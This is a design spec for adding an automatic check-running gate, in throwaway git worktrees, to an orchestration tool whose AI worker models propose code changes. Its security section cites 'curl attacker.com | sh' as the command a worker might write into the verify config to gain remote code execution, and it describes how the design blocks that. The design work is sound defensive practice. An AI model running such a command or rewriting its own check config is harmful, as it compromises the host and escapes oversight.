# Worker Self-Verification — Run Checks Before a Submission Counts

**Date:** 2026-07-03
**Status:** Approved design, pre-implementation
**Relates to:** first of three planned "elevate elodrome" specs (this one, cost/latency-aware
Elo, and a shared team-wide leaderboard — each gets its own spec/plan/implementation cycle).

## Goal

Today the sandbox is strictly read-only (`read_file`/`list_dir`/`glob`/`grep`) and a worker's
proposed changes are only checked for "does this diff apply cleanly" (`patch/validate.ts`) before
going to a reviewing model. Nothing ever actually runs the proposed code. This means a change that
breaks the build or fails existing tests can still win a tournament or pass review purely on how
plausible it reads.

This spec adds an automatic verification gate: after a worker submits, its changes are applied to
a throwaway git worktree and a repo-configured set of commands (typecheck, test, etc.) run against
them. Failures are fed back to the worker for one revision attempt before the run is marked
`failed_review`. This is a pipeline-level gate, not a new worker tool — the worker never chooses
whether to verify; it always happens when a repo has verification configured.

## Decisions (settled during brainstorming)

| Question | Decision |
|---|---|
| Trigger mechanism | **Automatic gate** after `submit_result`, not a worker-invoked tool. Guarantees every submission is checked. |
| Isolation mechanism | **Git worktree** (`git worktree add --detach`), not a shadow copy or apply-in-place-then-revert. Fast (hardlinks), matches this project's own worktree/"lane" convention, never touches the real working tree. |
| Non-git workspace / `git` unavailable | **Skip silently**, recorded as `verification: 'skipped'` in the response/trace. `delegate()` behaves exactly as it does today — verification is a quality enhancement, never a correctness dependency. |
| Command source | **User-configured per repo** via `elodrome.verify.json` at the workspace root, read from `HEAD` only — never from the worker's proposed changes (see Security addendum below). No repo config → verification skipped. |
| Malformed config | **Fail loudly, not silently.** A present-but-invalid `elodrome.verify.json` (bad JSON or wrong shape) throws, distinct from "absent" (which skips) — matches the fail-fast precedent already set by `config.ts`'s `positiveNumber`. |
| Command failure handling | **Run all configured commands, report all failures together** (not stop-on-first-failure) — gives the worker everything to fix in one revision pass. |
| Tournament mode scope | **Both single and tournament mode**, from the start. Each contestant is verified independently before judging. |
| Retry policy | **One revision attempt.** Worker gets the aggregated failure output and one chance to resubmit; still failing → `failed_review`, same terminal state a failed critique produces today. |
| Elo/learning integration | **Record as trace/briefing data only** (pass-on-first-try vs. needed-a-revision), reusing the existing learning-note/briefing mechanism. No new scoring formula — that's deferred to the separate cost/latency-aware Elo spec. |

## Components

### 1. Config: `elodrome.verify.json` (workspace root)

```json
{
  "typecheck": "pnpm typecheck",
  "test": "pnpm test"
}
```

Flat map of label → shell command, validated with a Zod schema (`z.record(z.string(), z.string())`,
matching how every other config surface in this codebase is validated). Order of execution follows
object key order (informational only, since all commands always run regardless of earlier
failures). Missing file or empty object means verification is skipped for that repo — identical
outcome to the non-git case. A file that exists but fails to parse as JSON or fails the schema
throws immediately (`delegate()` fails fast) rather than silently degrading to `skipped` — a typo'd
config should never look identical to "verification intentionally not configured."

**Security: config is read from `HEAD`, never from the worker's proposed changes.** The worktree's
copy of `elodrome.verify.json` (checked out from `HEAD`, see §2 below) is what's parsed and
executed — not any version the worker's `submit_result` might propose. If a worker's changes
include a modification to `elodrome.verify.json`, that specific change is excluded from
`verifyChanges`'s apply step for this run (it's still returned to the caller as a normal
`ValidatedChange` for the orchestrator to review/apply on its own, same as any other file — it's
only excluded from being *live* during this run's verification). Without this, a worker could
rewrite the command list to something like `curl attacker.com | sh` and have it executed with
network access inside a directory that also has repo file access — turning a quality gate into a
remote-code-execution gate. This is a hard requirement, not a hardening nice-to-have: the entire
sandbox's threat model (`sandbox.ts`'s containment/denylist work) assumes a worker can only ever
*propose* changes, never cause code to *run*; this feature is the first exception to that
assumption, so closing this specific gap is what keeps the exception narrow and intentional.

New `Config` fields (`src/config.ts`, following the existing `maxWorkerRequests`/`workerTimeoutMs`
pattern):
- `verifyTimeoutMs` — default `180_000`, env `ELODROME_VERIFY_TIMEOUT_MS`. Per-command timeout;
  process is killed on expiry and that command is reported as a failure ("timed out after Nms").
- Output (stdout+stderr merged) truncated to a fixed budget (reusing the `truncate()` idiom from
  `sandbox/tools.ts`, ~4,000 chars per command) before being fed back to the worker or written to
  trace.

### 2. `src/verify/` — new module

```
src/verify/worktree.ts   — create/apply-changes/cleanup for a throwaway git worktree
src/verify/run.ts        — execute configured commands, aggregate results
src/verify/index.ts      — verifyChanges(sandbox, changes, config): Promise<VerifyResult>
```

```typescript
export interface CheckResult { name: string; exitCode: number | null; output: string }
export interface VerifyResult {
  status: 'skipped' | 'passed' | 'failed'
  checks: CheckResult[]   // empty when skipped
  reason?: string         // populated when skipped, e.g. "not a git repository"
}
```

**Worktree creation** (`worktree.ts`): detect the repo via `git rev-parse --show-toplevel` run
from the sandbox root; `ENOENT` (git missing) or non-zero exit (not a repo) → `skipped`. On
success, `git worktree add --detach --no-checkout <tmpdir>` followed by an explicit checkout with
hooks disabled (`git -c core.hooksPath=/dev/null checkout HEAD`), into a uniquely-named temp dir
under `os.tmpdir()` (same random-suffix idiom as `newRunId()` in `trace/trace.ts`, so parallel
tournament verifications never collide). Disabling hooks matters because this worktree checks out
whatever is committed at `HEAD` — a repo whose `HEAD` carries a malicious commit (e.g. from an
unreviewed branch elsewhere in its history) should not get to execute a `post-checkout` hook as a
side effect of being verified.

An empty repository (no commits yet, `HEAD` unborn) makes `git worktree add ... HEAD` fail even
though `git rev-parse --show-toplevel` succeeds (a `.git` directory exists without a `HEAD` ref).
This is treated as `skipped` (folded into the general "worktree creation fails for any other
reason" case below), not a distinct error — but it's called out explicitly here because it's a
realistic case for freshly-initialized projects, not a hypothetical edge case.

Worktrees are created from `HEAD`, not the live working tree's uncommitted state. This is a known,
documented property: the worker's own reads (via `Sandbox`) see the real working tree including
uncommitted edits, but the *verification* step only sees what's committed plus the proposed diff.
A task that depends on uncommitted local changes will verify without them — acceptable, not a bug,
and out of scope to fix here. Repos using git submodules will similarly get an unpopulated
submodule directory in the worktree (`git worktree add` doesn't initialize submodules) — verify
commands that depend on submodule content will fail for that reason, not because of the proposed
diff. Not fixed in this design (submodule init adds real time cost to every verify run); documented
here so a "test failure" report includes enough context for a repo owner to recognize the actual
cause rather than assume the worker's change is at fault.

**Reading the verify config**: `elodrome.verify.json` is read from the freshly-checked-out worktree
— i.e. from `HEAD`, before any of the worker's proposed changes are applied. This ordering is what
makes the security property in §1 hold: the config that determines what executes is always fixed
before the worker's diff is ever applied to that worktree.

**Applying changes**: `full` changes are written directly (`fs.writeFileSync`); `diff` changes are
applied with the same `applyPatch` (`diff` package) already used in `patch/validate.ts` — guaranteed
to apply cleanly since this only runs after `validateChanges` has already confirmed that. A change
whose `path` is `elodrome.verify.json` is skipped during this apply step specifically (see the
security addendum in §1) — it is still included in the `ValidatedChange[]` returned to the rest of
the pipeline as normal, just not made live for this run's own verification.

**Running commands** (`run.ts`): each configured command runs via
`execFile('sh', ['-c', command], { cwd: worktreeRoot, timeout: verifyTimeoutMs })`. All commands
run regardless of earlier failures; results collected into `CheckResult[]`. A per-process semaphore
bounds total concurrent verify commands across all in-flight `delegate()`/tournament calls (default
cap TBD at implementation time, exposed as `ELODROME_MAX_CONCURRENT_VERIFY` or similar) — without
this, a tournament with several contestants each running several commands can produce spurious
timeout "failures" that are really CPU/memory contention on the host, not real check failures.

**Cleanup**: `git worktree remove --force <tmpdir>` in a `finally`, followed by a defensive
`fs.rmSync(tmpdir, { recursive: true, force: true })` in case git can't clean up on its own (e.g.
process killed mid-run). No leftover worktrees or temp dirs on any exit path, including timeouts
and thrown errors.

**Concurrency**: `git worktree add`/`remove` on the same repo serialize at the git level (they take
a lock on `.git/worktrees`), which is correctness-safe but can transiently fail under contention
(multiple tournament contestants verifying in parallel, or multiple concurrent `delegate()` calls
against the same repo from different sessions). `worktree.ts` retries `git worktree add` a small,
fixed number of times with backoff specifically on lock-contention-shaped errors (`fatal:.*
already exists|index.lock`) before giving up and reporting `skipped` — without this, verification
would silently and disproportionately degrade exactly when tournament/concurrent load is highest,
which is the opposite of when you'd want it most reliable.

### 3. Pipeline integration

**`singleDelegate` (`src/pipeline/delegate.ts`)**: after `validateChanges` produces all-valid
changes, call `verifyChanges`. On `'failed'`, build a revision message from the aggregated
`checks` (name + truncated output per failing check, all of them) and re-enter the worker loop
once — same shape as the existing failed-critique revision branch, just a different message
source. On `'passed'` or `'skipped'`, proceed to `runCritique` as today.

**Tournament mode (`src/arena/arena.ts`)**: `verifyChanges` runs per-contestant after each one's
`validateChanges`, before judging, in parallel (bounded by the concurrency semaphore from §2; git
worktree operations serialize/retry as described above). A contestant that still fails verification
after its one revision attempt is excluded from winning via the existing `ForfeitRecord` mechanism
(`arena.ts:10`), using forfeit kind **`'loss'`, not `'no_contest'`**. This distinction matters:
`'no_contest'` triggers `addAvailabilityStrike` (`delegate.ts:126`) — an infra-unavailability
penalty meant for API/timeout failures, not code quality — so reusing it for a verify failure would
pollute a model's availability-strike statistics with what is actually a quality signal. `'loss'`
already exists in the codebase for exactly this kind of "the model competed but produced a losing
entry" outcome, and carries no availability penalty. Judges see a pass/fail verify badge per entry
in the anonymized briefing, not raw command output, to avoid leaking model-identifying
command-output style into blind judging.

**`DelegateResponse`**: add `verify: VerifyResult` for single mode, or
`Record<string, VerifyResult>` keyed by contestant for tournament mode (alongside the existing
`arena` field).

**Trace (`src/trace/trace.ts`)**: record `verify: { status, checkNames, revisionUsed: boolean }`
per run — enough to compute "how often does this model need a verify-revision" without bloating
trace files with full command output. This intentionally drops per-check pass/fail granularity
(e.g. "typecheck failed but test passed") — a deliberate simplification for this spec's scope, not
an oversight; a future spec wanting per-check reliability metrics would need to extend this shape.

**Briefing (`src/arena/select.ts`, `buildBriefing`)**: extend the existing per-model learning-note
briefing with a derived line when relevant, e.g. *"3 of your last 5 runs needed a verify-revision
(typecheck) before passing."* Reuses the existing learning-note plumbing; no new schema required
beyond what's already read from trace history.

## Error Handling & Safety

- **`git` missing**: `ENOENT` from `execFile('git', ...)` is treated identically to "not a git
  repo" — skip, don't crash `delegate()`.
- **Worktree creation fails for any other reason** (unborn `HEAD` in an empty repo, repo in a weird
  state, disk full, etc., after the lock-contention retries in §2 are exhausted): treated as
  `skipped` with the error message as `reason`. Verification must never block an otherwise-valid
  delegation.
- **Check command times out**: killed via the `execFile` `timeout` option; reported as a failing
  check (`exitCode: null`, output `"timed out after {verifyTimeoutMs}ms"`), flows through the same
  revision/failure path as any other failure.
- **Network access during checks**: not blocked. These are human-configured commands — identical
  trust level to running `pnpm test` locally yourself. This differs from the worker's own tool
  calls, which remain fully sandboxed; it is a documented property, not a gap. Note this trust
  assumption holds for the config, not the repo content it operates on: if elodrome is ever run
  unattended against repos whose `HEAD` isn't reviewed by a human before use (e.g. auto-merged
  branches), the commands in `elodrome.verify.json` still execute against whatever that `HEAD`
  contains — the same trust boundary a human running `pnpm test` after an unreviewed merge would
  face. Not a new risk this feature introduces, but worth naming since this is the first pipeline
  stage that executes anything at all.
- **Malicious/adversarial diff content**: path containment and the secrets denylist are covered
  upstream by `validateChanges`/`Sandbox.resolve`, so nothing outside the repo can be written
  regardless of what a worker proposes. Separately, and specific to this feature: a diff that
  targets `elodrome.verify.json` itself cannot alter what executes during its own run — see the
  security addendum in §1.
- **Check output may contain secrets**: command output (e.g. a test run against a repo with a
  locally-configured secret) is captured and truncated but not scanned or redacted before being fed
  into the worker's revision prompt or written to trace. This is a residual, documented risk rather
  than a solved one — worth revisiting if trace files or revision prompts are ever shared outside
  the environment that produced them.
- **Leftover worktrees from a crashed prior run**: no startup GC pass (out of scope for this
  design), but orphaned worktrees must not be silently invisible — the verify module logs the
  temp dir path at creation time so a stuck/crashed run's leftovers can be found and removed
  manually. A dedicated cleanup subcommand is a candidate follow-up if this proves to be a recurring
  problem in practice.

## Testing Strategy

- **`src/verify/worktree.ts`**: unit tests against a real temp git repo (`git init` in
  `beforeAll`, same idiom as `tests/sandbox.test.ts`'s `mkdtempSync` setup) — worktree
  creation/cleanup, non-git-dir detection, empty-repo (unborn `HEAD`) detection, both `full` and
  `diff` change application.
- **Security regression test (required, not optional)**: a `full` change targeting
  `elodrome.verify.json` that tries to replace the configured command must be proven to have zero
  effect on which commands execute during that run — assert the *original* `HEAD` config is what
  ran, not the proposed one. This is the single most important test this feature adds.
- **`src/verify/run.ts`**: unit tests with fast synthetic commands (`exit 0`, `exit 1`, `sleep` for
  timeout) — no real test suites needed to exercise the logic.
- **`src/verify/index.ts`**: integration test combining both — a temp repo with an
  `elodrome.verify.json` running a trivial command, asserting `passed`/`failed`/`skipped` outcomes,
  plus a malformed-config case asserting it throws rather than silently returning `skipped`.
- **`delegate.ts` / `arena.ts` integration**: extend `tests/delegate.test.ts` / `tests/arena.test.ts`
  with a dependency-injected fake `verifyChanges` (same pattern already used for `client.chat`) to
  test the revision-loop wiring without real git operations in every test, including asserting a
  tournament verify-failure produces forfeit kind `'loss'` and does **not** call
  `addAvailabilityStrike`.
- No changes needed to `tests/tools.test.ts` / `tests/sandbox.test.ts` — the read-only sandbox is
  untouched by this feature.

## Out of Scope (this spec)

- Cost/latency-aware Elo scoring of verify-revision behavior (separate spec).
- Shared team-wide leaderboard / registry (separate spec).
- Startup garbage-collection of orphaned worktrees (leftover worktrees are logged, not swept — see
  Error Handling & Safety).
- Submodule initialization in verify worktrees (documented limitation, not fixed here).
- Secret redaction in captured command output (documented residual risk, not fixed here).
- A worker-invoked `run_check` tool (considered and explicitly rejected in favor of the automatic
  gate — see Decisions table).
